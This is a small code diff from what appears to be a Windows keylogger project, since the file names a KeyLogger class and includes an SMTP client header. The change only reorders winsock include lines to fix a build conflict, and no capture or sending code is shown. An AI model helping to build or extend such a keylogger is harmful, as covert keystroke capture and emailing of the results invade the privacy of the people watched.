@@ -3,6 +3,10 @@
  * @brief Implementation of the KeyLogger class
  */
 
+// For IP address resolution - Include winsock2.h BEFORE Windows.h to avoid conflicts
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
 #include "../include/KeyLogger.h"
 #include "../include/SmtpClient.h"
 
@@ -11,10 +15,6 @@
 #include <Lmcons.h>
 #include <ShlObj.h>
 #include <direct.h>
-
-// For IP address resolution
-#include <winsock2.h>
-#include <ws2tcpip.h>
 
 #include <Windows.h>
 #include <fstream>
